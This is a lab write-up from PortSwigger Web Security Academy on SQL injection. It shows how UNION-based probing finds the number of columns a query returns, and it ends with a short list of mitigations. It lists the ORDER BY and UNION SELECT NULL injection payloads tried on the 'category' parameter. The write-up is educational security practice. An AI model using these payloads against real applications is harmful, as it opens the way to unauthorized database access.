# Lab 02 – Authentication Bypass (Determining Number of Columns)

## Lab Information

| Item | Value |
|------|-------|
| Platform | PortSwigger Web Security Academy |
| Category | SQL Injection |
| Topic | UNION Attack - Determining Number of Columns |
| Difficulty | Apprentice |
| Status | ✅ Solved |

---

# Objective

Determine the number of columns returned by the SQL query using a UNION SELECT attack.

---

# Lab Description

The application is vulnerable to SQL Injection in the `category` parameter.

To perform UNION attacks successfully, the attacker must first determine the number of columns returned by the original query.

---

# Vulnerability

Type

SQL Injection

Injection Point

GET Parameter

Parameter

category

---

# Testing Process

Started with

```

' ORDER BY 1--

```

Continue increasing

```

' ORDER BY 2--

' ORDER BY 3--

' ORDER BY 4--

```

Alternatively

```

' UNION SELECT NULL--

' UNION SELECT NULL,NULL--

' UNION SELECT NULL,NULL,NULL--

```

---

# Successful Payload

```

' UNION SELECT NULL,NULL,NULL--

```

---

# Result

The application accepted the payload.

This confirms that the original SQL query returns **3 columns**.

---

# Impact

Knowing the correct number of columns is the first step toward extracting database information using UNION attacks.

---

# Mitigation

- Prepared Statements
- Parameterized Queries
- ORM
- Input Validation

---

# Files

- 01-notes.md
- 02-payloads/
- 03-report.md
- 04-references.md
- 05-screenshots/
- 06-burp/

---

# Tools Used

- Burp Suite Professional
- Firefox
- PortSwigger Academy

---

# Result

✅ Lab Solved